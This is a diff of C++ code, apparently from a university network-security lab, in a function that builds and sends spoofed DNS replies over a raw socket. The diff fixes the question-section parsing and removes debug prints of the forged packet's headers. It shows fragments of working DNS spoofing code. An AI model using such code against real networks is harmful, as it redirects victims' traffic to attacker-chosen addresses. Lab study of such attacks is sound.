@@ -398,13 +398,18 @@ void send_spoofed_dns_reply(char *packet)
     // move the pointer to the answer section
     // char *dns_answer = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
     // derive the question section
-    ///////////////////////////////////////////
+    int queries_len = 5;
     while (*dns_query != 0)
     {
-        // cout << *dns_query; // www nycu edu tw
-        dns_query++;
+        queries_len += *dns_query + 1;
+        dns_query += *dns_query + 1;
     }
-    dns_query += 4; 
+    cout << "Queries length: " << queries_len << endl;
+    cout << "Position of dns_query: " << dns_query - packet << endl;
+    // move the pointer to the answer section
+    dns_query += 1;
+    cout << "Position of dns_query: " << dns_query - packet << endl; 
+    // derive the answer section
     char *dns_answer = dns_query;
     struct answer_section *answer = (struct answer_section *)dns_answer;
     answer->name = htons(0xc00c);
@@ -501,24 +506,7 @@ void send_spoofed_dns_reply(char *packet)
     // attach the packet with eth header
     char *spoofed_packet = (char *)malloc(total_len + ETHER_HEADER_LEN);
     memcpy(spoofed_packet, eth_header, ETHER_HEADER_LEN);
-    memcpy(spoofed_packet + ETHER_HEADER_LEN, packet, total_len);
-    parse spoofed packet to check
-    struct iphdr *spoofed_ip_header = (struct iphdr *)(spoofed_packet + ETHER_HEADER_LEN);
-    cout << "Source IP: " << inet_ntoa(*(in_addr *)&spoofed_ip_header->saddr) << endl;
-    cout << "Destination IP: " << inet_ntoa(*(in_addr *)&spoofed_ip_header->daddr) << endl;
-    struct udphdr *spoofed_udp_header = (struct udphdr *)(spoofed_packet + ETHER_HEADER_LEN + spoofed_ip_header->ihl * 4);
-    cout << "Source Port: " << ntohs(spoofed_udp_header->source) << endl;
-    cout << "Destination Port: " << ntohs(spoofed_udp_header->dest) << endl;
-    struct dnshdr *spoofed_dns_header = (struct dnshdr *)(spoofed_packet + ETHER_HEADER_LEN + spoofed_ip_header->ihl * 4 + sizeof(udphdr));
-    cout << "Flags: " << ntohs(spoofed_dns_header->flags) << endl;
-    cout << "Answer count: " << ntohs(spoofed_dns_header->ancount) << endl;
-    cout << "Answer count: " << ntohs(spoofed_dns_header->adcount) << endl;
-    cout << "Answer count: " << ntohs(spoofed_dns_header->aucount) << endl;
-    char *spoofed_dns_query = (char *)(spoofed_packet + ETHER_HEADER_LEN + spoofed_ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
-    cout << "DNS query: " << spoofed_dns_query << endl;
-    char *spoofed_dns_answer = (char *)(spoofed_packet + ETHER_HEADER_LEN + spoofed_ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
-    cout << "DNS answer: " << spoofed_dns_answer << endl;
-
+    memcpy(spoofed_packet + ETHER_HEADER_LEN, packet, total_len);    
 
     // send the packet
     int sock_raw_fd;
